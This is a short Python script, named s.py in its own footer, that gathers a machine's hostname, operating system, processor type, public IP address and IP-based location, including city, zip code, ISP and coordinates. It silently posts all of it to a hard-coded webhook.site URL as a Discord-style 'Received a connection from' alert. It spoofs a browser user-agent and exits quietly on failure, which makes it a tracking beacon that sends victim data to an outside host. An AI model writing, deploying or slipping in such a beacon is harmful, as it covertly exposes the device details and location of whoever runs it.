import sys
import requests
import socket
import json
from datetime import datetime
import platform
def main():
    webhook = "https://webhook.site/f1192772-31e6-4b54-91ba-7a8fdf457b94"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"}

    hostname = socket.gethostname()
    country = ""
    city = ""
    isp = ""
    zip_code = ""
    x = ""
    y = ""
    try:
        public_ip = requests.get("https://ipapi.co/ip", headers=headers).text
        try:
            ip_request = requests.get(f"http://ip-api.com/json/{public_ip}?fields=1098745")
            if ip_request.status_code == 200:
                ipdata = json.loads(ip_request.text)
                if ipdata["status"] == "success":
                    country = ipdata["country"]
                    city = ipdata["city"]
                    zip_code = ipdata["zip"]
                    x = ipdata["lon"]
                    y = ipdata["lat"]
                    isp = ipdata["isp"]
                elif ipdata["status"] == "fail":
                    pass
            else:
                pass
        except:
            pass
    except requests.ConnectionError:
        return sys.exit()
    send_webhook(url=webhook, hostname=hostname, ip=public_ip, country=country, city=city, zip_code=zip_code, isp=isp,
                 x=x, y=y)
def send_webhook(url, hostname, ip, country, city, zip_code, isp, x, y):
    embed = {
        "title": f"Received a connection from: {hostname}", 
        "fields": [
            { 
                "name": "Host Information", 
                "value": 
                    f"Host name: {hostname}\n"
                    f"OS: {platform.platform()}\n"
                    f"Machine type: {platform.machine()}\n"
                    f"Processor type: {platform.processor()}\n"
                    f"IP address: {ip}"
            },
            {
                "name": "Location Information",
                "value":
                    f"Country: {country}\n"
                    f"City: {city}\n"
                    f"Zip: {zip_code}\n"
                    f"ISP: {isp}\n"
                    f"Longitude (X): {x}\n"
                    f"Latitude (Y): {y}\n"
            }
        ],
        "footer": {"text": f"s.py@snake | {datetime.now()}"}
    }
    data = {"username": "s.py", "embeds": [embed]}
    requests.post(url=url, json=data)
if __name__ == '__main__': main()
